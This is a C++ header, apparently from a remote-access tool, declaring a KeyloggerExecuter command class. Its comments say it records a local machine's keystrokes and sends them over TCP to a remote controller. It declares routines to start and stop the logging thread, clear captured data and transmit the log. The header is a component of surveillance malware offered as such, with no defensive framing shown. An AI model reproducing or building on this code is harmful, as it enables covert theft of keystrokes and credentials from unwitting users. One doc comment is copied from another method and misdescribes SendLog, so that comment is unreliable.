#pragma once

#include <utility>

#include "command/interface/ICommandExecuter.h"
#include "networking/interfaces/ITCPClient.h"
#include "methods/keylogger/Keylogger.h"


namespace command
{
/**
  * Objects of type KeyloggerExecuter save and send keystrokes
  * of local machine to remote control.
  */
class KeyloggerExecuter
    : public ICommandExecuter
{
public:
    KeyloggerExecuter(tag_t tag,
                      methods::keylogger::Keylogger keylogger)
        : ICommandExecuter(tag),
          m_keylogger(std::move(keylogger))
    {}
    virtual ~KeyloggerExecuter() = default;

    bool Execute(char const *byte_array,
                 uint32_t length,
                 networking::ITCPClient& connection)
    noexcept override;


protected:

    methods::keylogger::Keylogger m_keylogger;

    /**
      * This enum is used to command remote thread's state.
      */
    enum ThreadState
    {
        Start,
        Stop,
        Keep
    };

    /**
      * This struct is used to explicitly address significant addresses
      * inside the received bytes array.
      */
#pragma pack(1)
    typedef struct
    {
        ThreadState thread_state;
        bool get_data;
        bool clear_data;
    } s_Translation;
#pragma pack()

    /**
      * This function executes a validated byte array.
      * @param byte_array - the validated byte array
      * @param connection - a TCP client to communicate with remote control.
      * @return If an error occurs, false is returned.
      *         Otherwise, true is returned.
      */
    bool ExecuteTranslatedByteArray(s_Translation *byte_array,
                                    networking::ITCPClient& connection);

    /**
      * Function manages logging thread's execution depending
      * on thread state request.
      * @param[in] state - thread state request.
      * @return - On success, true is returned.
      *           Otherwise, false is returned.
      */
    bool ManageThread(ThreadState state);

    /**
      * Function manages logging thread's execution depending
      * on thread state request.
      * @param[in] connection - a TCP client to communicate with remote control.
      * @return - On success, true is returned.
      *           Otherwise, false is returned.
      */
    bool SendLog(networking::ITCPClient& connection);

};
}
